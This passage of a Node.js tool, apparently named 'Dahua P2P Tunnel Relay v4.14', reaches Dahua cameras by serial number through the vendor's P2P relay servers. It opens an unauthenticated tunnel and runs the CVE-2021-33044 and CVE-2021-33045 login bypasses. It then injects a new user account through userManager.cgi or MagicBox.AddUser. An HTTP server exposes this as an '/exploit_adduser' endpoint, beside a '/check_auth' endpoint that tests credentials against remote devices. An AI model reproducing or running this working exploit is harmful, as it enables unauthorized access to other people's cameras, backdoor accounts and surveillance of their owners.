  allSteps.push({ step: 'p2p', status: 'done', message: 'ONLINE — US: ' + p2pStatus.relay });
  allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP (sin auth)...' });
  var tunnel = null;
  try {
    tunnel = await establishTunnel(serial, null, null, targetPort);
    allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (sin auth)' });
  } catch (err) {
    allSteps.push({ step: 'tunnel', status: 'failed', message: 'Tunel PTCP fallo: ' + err.message });
    return { success: false, steps: allSteps };
  }
  try {
    allSteps.push({ step: 'exploit', status: 'running', message: 'CVE-2021-33044 (NetKeyboard)...' });
    var loginResult = await exploitLoginBypass(tunnel.deviceSock, targetPort);
    loginResult.detail.forEach(function(d) { allSteps.push({ step: 'exploit_detail', message: d }); });
    if (loginResult.success) {
      allSteps.push({ step: 'exploit', status: 'done', message: 'Auth bypassed! Session: ' + loginResult.session.substring(0, 16) + '...' });
      allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando "' + newUser + '"...' });
      var realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
      var cgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
      var addRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {Cookie: 'DHSession=' + loginResult.session}, '');
      if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado!' }); return { success: true, steps: allSteps }; }
      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI HTTP ' + addRes.status + ', intentando MagicBox...' });
      realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
      var mbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loginResult.session }));
      if (mbRes.status === 200) { try { if (JSON.parse(mbRes.body).result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'MagicBox OK!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
      allSteps.push({ step: 'adduser', status: 'failed', message: 'HTTP ' + addRes.status });
      return { success: false, steps: allSteps };
    }
    allSteps.push({ step: 'exploit', status: 'failed', message: 'NetKeyboard: ' + loginResult.error });
    allSteps.push({ step: 'exploit', status: 'running', message: 'CVE-2021-33045 (Loopback)...' });
    var lbResult = await exploitLoginBypassLoopback(tunnel.deviceSock, targetPort);
    lbResult.detail.forEach(function(d) { allSteps.push({ step: 'exploit_detail', message: d }); });
    if (lbResult.success) {
      allSteps.push({ step: 'exploit', status: 'done', message: 'Loopback OK!' });
      allSteps.push({ step: 'adduser', status: 'running', message: 'MagicBox.AddUser...' });
      var lbRealm = await bindTunnelPort(tunnel.deviceSock, targetPort);
      var lbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm, '/RPC2', 'POST', {'Content-Type':'application/json'}, JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: lbResult.session }));
      if (lbRes.status === 200) { try { if (JSON.parse(lbRes.body).result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'OK!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
      allSteps.push({ step: 'adduser', status: 'failed', message: 'HTTP ' + lbRes.status });
      return { success: false, steps: allSteps };
    }
    allSteps.push({ step: 'exploit', status: 'failed', message: 'Loopback: ' + lbResult.error });
    return { success: false, steps: allSteps };
  } finally { if (tunnel) { try { tunnel.deviceSock.close(); } catch(e) {} try { tunnel.mainSock.close(); } catch(e) {} } }
}

async function checkP2P(serial) {
  var mainIp = await resolveHostname(MAIN_SERVER);
  return new Promise(function(resolve) {
    var client = dgram.createSocket('udp4');
    var resolved = false;
    client.on('message', function(data) {
      if (resolved) return; resolved = true; client.close();
      var res = parseP2PResponse(data);
      var usAddr = res.xmlBody.US;
      if (!usAddr) { resolve({ serial: serial, online: false, error: 'Not registered' }); return; }
      var usParts = usAddr.split(':');
      var client2 = dgram.createSocket('udp4');
      var r2 = false;
      client2.on('message', function(d2) {
        if (r2) return; r2 = true; client2.close();
        var pres = parseP2PResponse(d2);
        resolve({ serial: serial, online: pres.code === 200, relay: usAddr, probe_code: pres.code });
      });
      client2.on('error', function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false }); } });
      setTimeout(function() { if (!r2) { r2 = true; client2.close(); resolve({ serial: serial, online: false, error: 'Probe timeout' }); } }, 4000);
      client2.send(buildP2PRequest('DHGET', '/probe/device/' + serial), parseInt(usParts[1]), usParts[0]);
    });
    client.on('error', function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false }); } });
    setTimeout(function() { if (!resolved) { resolved = true; client.close(); resolve({ serial: serial, online: false, error: 'Timeout' }); } }, 4000);
    client.send(buildP2PRequest('DHGET', '/online/p2psrv/' + serial), MAIN_PORT, mainIp);
  });
}

// v4.14: CREDENTIAL VALIDATION VIA RELAY-CHANNEL RESPONSE.
// Previous versions tried to read the device's channel response (200/403) directly,
// but Render's symmetric NAT blocks it (response comes from device/US IP, not main IP).
// New approach: send channel with auth → register relay-channel → PTCP handshake
// with relay agent. The PTCP handshake goes THROUGH the agent (mainSock has NAT
// mapping with agent from relay/start). If creds are valid, device accepts channel,
// connects to agent, and PTCP SYN-ACK arrives. If invalid (403), device doesn't
// connect to agent → PTCP timeout = invalid credentials.
async function checkAuth(serial, username, password) {
  var result = { serial: serial, authenticated: false, steps: [] };
  var mainSock = null, deviceSock = null;
  try {
    var mainIp = await resolveHostname(MAIN_SERVER);
    mainSock = new P2PSocket(); await mainSock.bind(); mainSock.setRemote(mainIp, MAIN_PORT);
    deviceSock = new P2PSocket(); await deviceSock.bind(); deviceSock.setRemote(mainIp, MAIN_PORT);

    await mainSock.request('/probe/p2psrv');
    result.steps.push('Probe OK');

    var onlineRes = await mainSock.request('/online/p2psrv/' + serial);
    var usAddr = onlineRes.xmlBody.US;
    if (!usAddr) { result.error = 'Device not registered'; return result; }
    var usParts = usAddr.split(':');
    result.steps.push('US: ' + usAddr);

    // Probe+info device through US (separate socket, matching establishTunnel)
    var usSock = new P2PSocket(); await usSock.bind(); usSock.setRemote(usParts[0], parseInt(usParts[1]));
    await usSock.request('/probe/device/' + serial);
    await usSock.request('/info/device/' + serial);
    usSock.close();
    result.steps.push('Device probe+info OK');

    var relayRes = await mainSock.request('/online/relay');
    var relayAddr = relayRes.xmlBody.Address;
    var relayParts = relayAddr.split(':');
    result.steps.push('Relay: ' + relayAddr);

    // Build auth credentials for p2p-channel
    var key = getDeviceKey(username, password);
    var nonce = Math.floor(Math.random() * 0x7FFFFFFF);
    var auth = getDeviceAuth(username, key, nonce, '');
    var aid = crypto.randomBytes(8);
    var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
    var laddrStr = '127.0.0.1:' + deviceSock.lport;
    var encLaddr = getEnc(key, nonce, laddrStr);
    var channelBody = auth + aidHex + 'true' + encLaddr + '5.0.0';

    // Send channel request to main server (matching establishTunnel)
    deviceSock.setRemote(mainIp, MAIN_PORT);
    await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);
    result.steps.push('Channel sent (with auth)');

    // Get relay agent
    mainSock.setRemote(relayParts[0], parseInt(relayParts[1]));
    var agentRes = await mainSock.request('/relay/agent');
    var token = agentRes.xmlBody.Token;
    var agentAddr = agentRes.xmlBody.Agent;
    var agentParts = agentAddr.split(':');
    result.steps.push('Agent: ' + agentAddr);

    // Start relay
    mainSock.setRemote(agentParts[0], parseInt(agentParts[1]));
    await mainSock.request('/relay/start/' + token, ':0');
    result.steps.push('Relay started');

    // v4.14: Register relay-channel WITH shouldRead=true.
    // relay-channel is sent to mainIp:MAIN_PORT — mainSock has NAT mapping with
    // the main server (from initial probe), so the response gets through Render's NAT.
    // Device returns 200 (valid creds) or 403 (invalid) as the relay-channel response.
    mainSock.setRemote(mainIp, MAIN_PORT);
    var relayAuth = getDeviceAuth(username, key, nonce, '');
    var relayChannelBody = relayAuth + agentParts[0] + ':' + parseInt(agentParts[1]);
    var relayChanRes = await mainSock.request('/device/' + serial + '/relay-channel', relayChannelBody, true);
    result.steps.push('Relay-channel sent (waiting response)');

    if (relayChanRes) {
      result.steps.push('Relay-channel response: code=' + relayChanRes.code);
      result.code = relayChanRes.code;
      if (relayChanRes.code === 200) {
        result.authenticated = true;
        result.steps.push('AUTH OK (200)');
      } else if (relayChanRes.code === 403) {
        result.authenticated = false;
        result.error = 'Credenciales inválidas (403)';
        result.steps.push('AUTH FAILED (403)');
      } else {
        result.authenticated = false;
        result.error = 'Channel error: ' + relayChanRes.code;
        result.steps.push('Error: ' + relayChanRes.code);
      }
    } else {
      // No response from relay-channel — fall back to PTCP handshake test
      result.steps.push('No relay-channel response, trying PTCP handshake...');
      mainSock.setRemote(agentParts[0], parseInt(agentParts[1]));
      try { await mainSock.recv(3000); } catch(e) {}
      await mainSock.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
      try {
        await mainSock.readPTCP(10000);
        result.authenticated = true;
        result.steps.push('PTCP SYN-ACK received — credentials VALID');
      } catch(e) {
        result.authenticated = false;
        result.error = 'Credenciales inválidas (el dispositivo rechazó el canal)';
        result.steps.push('PTCP timeout — credentials INVALID');
      }
    }

    return result;
  } catch (err) {
    result.error = err.message;
    return result;
  } finally {
    if (mainSock) mainSock.close();
    if (deviceSock) deviceSock.close();
  }
}

function readBody(req) {
  return new Promise(function(resolve) {
    var body = ''; req.on('data', function(c) { body += c; }); req.on('end', function() { resolve(body); });
  });
}

// v4.8: Local transparent proxy — tunnels HTTP requests through P2P
var _cachedTunnel = null;
var _cachedSerial = null;

function clearCachedTunnel() {
  if (_cachedTunnel) {
    try { _cachedTunnel.deviceSock.close(); } catch(e) {}
    try { _cachedTunnel.mainSock.close(); } catch(e) {}
    _cachedTunnel = null;
    _cachedSerial = null;
  }
}

async function getCachedTunnel(serial, username, password) {
  if (_cachedTunnel && _cachedSerial === serial) return _cachedTunnel;
  clearCachedTunnel();
  console.log('[*] Establishing P2P tunnel to ' + serial + '...');
  var tunnel = await establishTunnel(serial, username, password, 80);
  console.log('[+] Tunnel established');
  _cachedTunnel = tunnel;
  _cachedSerial = serial;
  return tunnel;
}

async function handleProxyRequest(req, res) {
  var urlObj = new URL(req.url, 'http://localhost');
  var serial = urlObj.searchParams.get('sn') || process.env.SERIAL;
  var username = urlObj.searchParams.get('user') || process.env.DAHUA_USER;
  var password = urlObj.searchParams.get('pass') || process.env.DAHUA_PASS;

  if (!serial) {
    res.writeHead(400, {'Content-Type': 'text/plain'});
    return res.end('Serial required. Set SERIAL env var or add ?sn= param.\nUsage: PROXY_MODE=true SERIAL=5E07D56PBQBDEB3 node dahua_tunnel_relay.js');
  }

  urlObj.searchParams.delete('sn');
  urlObj.searchParams.delete('user');
  urlObj.searchParams.delete('pass');

  var cgiPath = urlObj.pathname;
  if (urlObj.search) cgiPath += urlObj.search;

  var body = '';
  if (req.method === 'POST' || req.method === 'PUT') body = await readBody(req);

  var fwdHeaders = {};
  var hkeys = Object.keys(req.headers);
  for (var hi = 0; hi < hkeys.length; hi++) {
    var hk = hkeys[hi].toLowerCase();
    if (hk === 'host' || hk === 'connection' || hk === 'content-length') continue;
    fwdHeaders[hkeys[hi]] = req.headers[hkeys[hi]];
  }

  for (var attempt = 0; attempt < 2; attempt++) {
    try {
      var tunnel = await getCachedTunnel(serial, username, password);
      var realmId = await bindTunnelPort(tunnel.deviceSock, 80);
      var resp = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, req.method, fwdHeaders, body);

      if (resp.status === 401 && username && password) {
        var wwwAuth = resp.headers['WWW-Authenticate'] || resp.headers['www-authenticate'];
        if (wwwAuth) {
          var dp = parseDigestAuth(wwwAuth);
          fwdHeaders['Authorization'] = buildDigestAuth(req.method, cgiPath, dp, username, password);
          realmId = await bindTunnelPort(tunnel.deviceSock, 80);
          resp = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, req.method, fwdHeaders, body);
        }
      }

      var cleanHeaders = {};
      var rkeys = Object.keys(resp.headers);
      for (var ri = 0; ri < rkeys.length; ri++) {
        if (rkeys[ri].toLowerCase() === 'transfer-encoding') continue;
        cleanHeaders[rkeys[ri]] = resp.headers[rkeys[ri]];
      }

      res.writeHead(resp.status, cleanHeaders);
      return res.end(resp.body);
    } catch(e) {
      console.error('[!] Proxy error (attempt ' + (attempt+1) + '): ' + e.message);
      clearCachedTunnel();
      if (attempt === 1) {
        res.writeHead(502, {'Content-Type': 'text/plain'});
        return res.end('P2P tunnel error: ' + e.message + '\n');
      }
    }
  }
}

var server = http.createServer(async function(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') { res.writeHead(200); return res.end(); }

  // v4.8: Local transparent proxy mode
  if (process.env.PROXY_MODE === 'true') { return handleProxyRequest(req, res); }

  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ status: 'ok', version: '4.14', features: ['status','tunnel','cgi','debug','debug_full','exploit','check_auth'] }));
  }

  if (req.url.startsWith('/debug/') && req.method === 'GET') {
    var debugSerial = req.url.replace('/debug/', '').split('?')[0];
    if (!debugSerial || debugSerial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
    var steps = [];
    try {
      var mainIp = await resolveHostname(MAIN_SERVER);
      var mainSock = new P2PSocket();
      await mainSock.bind(); mainSock.setRemote(mainIp, MAIN_PORT);
      steps.push('Probe: ' + (await mainSock.request('/probe/p2psrv')).code);
      var onlineRes = await mainSock.request('/online/p2psrv/' + debugSerial);
      var usAddr = onlineRes.xmlBody.US || 'none';
      steps.push('Online: US=' + usAddr);
      var usParts = usAddr.split(':');
      var usServer = usParts[0]; var usPort = parseInt(usParts[1]);

      // Probe + info through US
      var usSock = new P2PSocket(); await usSock.bind(); usSock.setRemote(usServer, usPort);
      steps.push('Dev probe: ' + (await usSock.request('/probe/device/'+debugSerial)).code);
      var devInfo = await usSock.request('/info/device/'+debugSerial);
      steps.push('Dev info: ' + devInfo.body.substring(0, 200));
      usSock.close();

      var relayRes = await mainSock.request('/online/relay');
      var relayAddr = relayRes.xmlBody.Address || 'none';
      steps.push('Relay: ' + relayAddr);
      var rParts = relayAddr.split(':');

      // Get relay agent + token
      mainSock.setRemote(rParts[0], parseInt(rParts[1]));
      var agentRes = await mainSock.request('/relay/agent');
      var agentAddr = agentRes.xmlBody.Agent || 'none';
      var token = agentRes.xmlBody.Token || '';
      steps.push('Agent: ' + agentAddr + ' Token=' + token);
      var aParts = agentAddr.split(':');

      // Start relay (plain text — v4.0)
      mainSock.setRemote(aParts[0], parseInt(aParts[1]));
      var dbgStart = await mainSock.request('/relay/start/'+token, ':0');
      steps.push('Relay start (plain): ' + dbgStart.code);

      // === Channel request with XML body (v4.0: XML works, plain text doesn't) ===
      var sockA = new P2PSocket(); await sockA.bind(); sockA.setRemote(mainIp, MAIN_PORT);
      var dbgAid = crypto.randomBytes(8);
      var dbgAidHex = Array.from(dbgAid).map(function(b) { return b.toString(16); }).join(' ');
      var channelBody = '<body><Identify>' + dbgAidHex + '</Identify><PubAddr>' + aParts[0] + ':' + parseInt(aParts[1]) + '</PubAddr></body>\r\n';
      await sockA.request('/device/'+debugSerial+'/p2p-channel', channelBody, false);
      steps.push('Channel request sent (XML body, port '+sockA.lport+')');
      // Read response: HTTP 100 then HTTP 200, skipping STUN packets
      var gotResponse = false;
      for (var di = 0; di < 8; di++) {
        try {
          var dRaw = await sockA.recv(8000);
          if (dRaw[0] !== 0x44 && dRaw[0] !== 0x48) { steps.push('  (STUN packet, skipping)'); continue; }
          var dResp = parseP2PResponse(dRaw);
          steps.push('RESP code=' + dResp.code + ' body=' + dResp.body.substring(0,200));
          if (dResp.code === 200) {
            var dbgParsed = parseChannelBody(dResp.body, dResp.xmlBody);
            steps.push('SUCCESS! Parsed: Identify=' + (dbgParsed.Identify||'none') + ' LocalAddr=' + (dbgParsed.LocalAddr||'none') + ' PubAddr=' + (dbgParsed.PubAddr||'none'));
            gotResponse = true; break;
          }
          if (dResp.code >= 400) { steps.push('ERROR: ' + dResp.code); gotResponse = true; break; }
        } catch(e) { steps.push('FAILED: ' + e.message); break; }
      }
      if (!gotResponse) steps.push('No HTTP response received');
      sockA.close();

      mainSock.close();
    } catch(e) { steps.push('FATAL: '+e.message); }
    res.writeHead(200, {'Content-Type':'application/json'});
    return res.end(JSON.stringify({serial:debugSerial, steps:steps}));
  }

  // v4.0: Full tunnel diagnostic — channel + relay-channel + PTCP handshake
  if (req.url.startsWith('/debug_full/') && req.method === 'GET') {
    var dfSerial = req.url.replace('/debug_full/', '').split('?')[0];
    if (!dfSerial || dfSerial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
    var dfSteps = [];
    try {
      var dfIp = await resolveHostname(MAIN_SERVER);
      var dfMain = new P2PSocket(); await dfMain.bind(); dfMain.setRemote(dfIp, MAIN_PORT);
      dfSteps.push('Probe: ' + (await dfMain.request('/probe/p2psrv')).code);
      var dfOnline = await dfMain.request('/online/p2psrv/' + dfSerial);
      var dfUS = dfOnline.xmlBody.US || 'none';
      dfSteps.push('Online: US=' + dfUS);
      var dfUSParts = dfUS.split(':');

      // v4.7: Probe + info through US server with SEPARATE socket (matching reference exactly)
      // Reference: p2psrv_remote.request("/probe/device/{SN}") then "/info/device/{SN}" then close
      // This prepares the device for the channel request. Without it, device doesn't respond.
      var dfUsSock = new P2PSocket(); await dfUsSock.bind(); dfUsSock.setRemote(dfUSParts[0], parseInt(dfUSParts[1]));
      try {
        var dfProbeRes = await dfUsSock.request('/probe/device/' + dfSerial);
        dfSteps.push('Dev probe (US): ' + dfProbeRes.code);
      } catch(e) { dfSteps.push('Dev probe (US) FAILED: ' + e.message); }
      try {
        var dfInfoRes = await dfUsSock.request('/info/device/' + dfSerial);
        dfSteps.push('Dev info (US): ' + dfInfoRes.body.substring(0, 200));
      } catch(e) { dfSteps.push('Dev info (US) FAILED: ' + e.message); }
      dfUsSock.close();

      var dfRelayRes = await dfMain.request('/online/relay');
      var dfRelayAddr = dfRelayRes.xmlBody.Address || 'none';
      dfSteps.push('Relay: ' + dfRelayAddr);
      var dfRParts = dfRelayAddr.split(':');

      // v4.7: NO NAT punch — reference doesn't do it; it may interfere with device state
      var dfDevSock = new P2PSocket(); await dfDevSock.bind(); dfDevSock.setRemote(dfIp, MAIN_PORT);
      dfSteps.push('Sockets: main port=' + dfMain.lport + ', dev port=' + dfDevSock.lport);

      // Channel request (matching reference: channel BEFORE relay/agent, plain text body)
      var dfAid = crypto.randomBytes(8);
      var dfAidHex = Array.from(dfAid).map(function(b) { return b.toString(16); }).join(' ');
      var dfChanBody = dfAidHex + 'true127.0.0.1:' + dfDevSock.lport + '5.0.0';
      await dfDevSock.request('/device/'+dfSerial+'/p2p-channel', dfChanBody, false);
      dfSteps.push('Channel sent (plain text, dev port=' + dfDevSock.lport + ', AFTER US probe/info)');

      dfMain.setRemote(dfRParts[0], parseInt(dfRParts[1]));
      var dfAgent = await dfMain.request('/relay/agent');
      var dfAgentAddr = dfAgent.xmlBody.Agent || 'none';
      var dfToken = dfAgent.xmlBody.Token || '';
      dfSteps.push('Agent: ' + dfAgentAddr + ' Token=' + dfToken);
      var dfAParts = dfAgentAddr.split(':');

      // Start relay (plain text)
      dfMain.setRemote(dfAParts[0], parseInt(dfAParts[1]));
      var dfStart = await dfMain.request('/relay/start/'+dfToken, ':0');
      dfSteps.push('Relay start: code=' + dfStart.code);

      var dfDevParsed = null;
      for (var dfi = 0; dfi < 8; dfi++) {
        try {
          var dfRaw = await dfDevSock.recv(30000);
          // v4.6: Log raw packet info for debugging
          var dfRawHex = Array.from(dfRaw.subarray(0, Math.min(dfRaw.length, 40))).map(function(b) { return b.toString(16).padStart(2, '0'); }).join(' ');
          dfSteps.push('  RAW recv: len=' + dfRaw.length + ' first40hex=' + dfRawHex);
          if (dfRaw[0] !== 0x44 && dfRaw[0] !== 0x48) { dfSteps.push('  (non-HTTP, skip)'); continue; }
          var dfResp = parseP2PResponse(dfRaw);
          dfSteps.push('Channel resp: code=' + dfResp.code + ' body=' + dfResp.body.substring(0,150));
          if (dfResp.code === 200) { dfDevParsed = parseChannelBody(dfResp.body, dfResp.xmlBody); break; }
          if (dfResp.code >= 400) { dfSteps.push('ERROR: ' + dfResp.code); break; }
        } catch(e) { dfSteps.push('Chan FAILED: ' + e.message); break; }
      }
      if (!dfDevParsed) {
        dfSteps.push('No channel response — checking if response went to main socket');
        dfSteps.push('  dfDevSock queue: ' + dfDevSock._msgQueue.length + ' msgs');
        dfSteps.push('  dfMain queue: ' + dfMain._msgQueue.length + ' msgs');
        if (dfMain._msgQueue.length > 0) {
          for (var qi = 0; qi < dfMain._msgQueue.length; qi++) {
            var qMsg = dfMain._msgQueue[qi];
            var qHex = Array.from(qMsg.subarray(0, Math.min(qMsg.length, 40))).map(function(b) { return b.toString(16).padStart(2, '0'); }).join(' ');
            dfSteps.push('  dfMain queued[' + qi + ']: len=' + qMsg.length + ' first40hex=' + qHex);
          }
        }
        dfDevSock.close(); dfMain.close();
      }
      else {
        dfSteps.push('Parsed: LocalAddr=' + (dfDevParsed.LocalAddr||'none') + ' PubAddr=' + (dfDevParsed.PubAddr||'none'));
        var dfPubParts = dfDevParsed.PubAddr.split(':');
        dfDevSock.setRemote(dfPubParts[0], parseInt(dfPubParts[1]));

        // Relay-channel registration (plain text)
        dfMain.setRemote(dfIp, MAIN_PORT);
        var dfRelayChanBody = dfAParts[0] + ':' + parseInt(dfAParts[1]);
        await dfMain.request('/device/'+dfSerial+'/relay-channel', dfRelayChanBody, false);
        dfSteps.push('Relay-channel sent (plain text)');

        // v4.4: Match reference — read one packet from agent (STUN), discard, then PTCP SYN
        dfMain.setRemote(dfAParts[0], parseInt(dfAParts[1]));
        try {
          var agentResp = await dfMain.recv(5000);
          dfSteps.push('Agent initial resp: len=' + agentResp.length + ' (discarded, matching reference)');
        } catch(e) { dfSteps.push('Agent resp: ' + e.message); }

        // PTCP handshake — send SYN, read SYN-ACK (readPTCP skips STUN automatically)
        await dfMain.requestPTCP(Buffer.from([0x00, 0x03, 0x01, 0x00]));
        dfSteps.push('PTCP SYN sent to ' + dfAParts[0] + ':' + parseInt(dfAParts[1]));
        var dfSynOk = false;
        try {
          var synAck = await dfMain.readPTCP(15000);
          dfSynOk = true;
          dfSteps.push('PTCP SYN-ACK received! body_len=' + synAck.body.length);
        } catch(e) { dfSteps.push('PTCP SYN-ACK FAILED: ' + e.message); }
        if (!dfSynOk) dfSteps.push('PTCP handshake with agent FAILED');
        else {
          await dfMain.requestPTCP(Buffer.concat([Buffer.from([0x17, 0x00, 0x00, 0x00]), Buffer.alloc(8)]));
          var dfPtcp = await dfMain.readPTCP(8000);
          while (dfPtcp.body.length === 0) dfPtcp = await dfMain.readPTCP(8000);
          dfSteps.push('PTCP sign received, body length=' + dfPtcp.body.length);
          dfSteps.push('TUNNEL HANDSHAKE COMPLETE');
        }
        dfDevSock.close();
      }
      dfMain.close();
    } catch(e) { dfSteps.push('FATAL: '+e.message); }
    res.writeHead(200, {'Content-Type':'application/json'});
    return res.end(JSON.stringify({serial:dfSerial, steps:dfSteps}));
  }

  // v4.9: Credential validation — tests user/pass against a device via p2p-channel
  if (req.url === '/check_auth' && req.method === 'POST') {
    try {
      var ca = JSON.parse(await readBody(req));
      if (!ca.serial || ca.serial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
      if (!ca.username || !ca.password) { res.writeHead(400); return res.end(JSON.stringify({error:'username and password required'})); }
      var authResult = await checkAuth(ca.serial, ca.username, ca.password);
      res.writeHead(200); return res.end(JSON.stringify(authResult));
    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
  }

  if (req.url === '/exploit_adduser' && req.method === 'POST') {
    try {
      var p = JSON.parse(await readBody(req));
      if (!p.serial || p.serial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
      if (!p.new_user || !p.new_pass) { res.writeHead(400); return res.end(JSON.stringify({error:'new_user and new_pass required'})); }
      var result = await exploitAddUser(p.serial, p.new_user, p.new_pass, p.target_port || 80);
      res.writeHead(200); return res.end(JSON.stringify(result));
    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
  }

  if (req.url === '/tunnel' && req.method === 'POST') {
    try {
      var p = JSON.parse(await readBody(req));
      if (!p.serial || !p.cgi_path) { res.writeHead(400); return res.end(JSON.stringify({error:'serial and cgi_path required'})); }
      var tunnel = await establishTunnel(p.serial, p.username, p.password, p.target_port || 80);
      var realmId = await bindTunnelPort(tunnel.deviceSock, p.target_port || 80);
      var resp = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, p.cgi_path, 'GET', {}, '');
      tunnel.deviceSock.close(); tunnel.mainSock.close();
      res.writeHead(200); return res.end(JSON.stringify(resp));
    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
  }

  var serial = req.url.replace(/^\//, '').split('?')[0];
  if (serial && serial.length >= 10) {
    try { var r = await checkP2P(serial); res.writeHead(200); return res.end(JSON.stringify(r)); }
    catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
  }
  res.writeHead(404); res.end(JSON.stringify({error:'Not found'}));
});

process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message, e.stack); });
process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });

server.listen(PORT, function() {
  console.log('Dahua P2P Tunnel Relay v4.14 running on port ' + PORT);
});
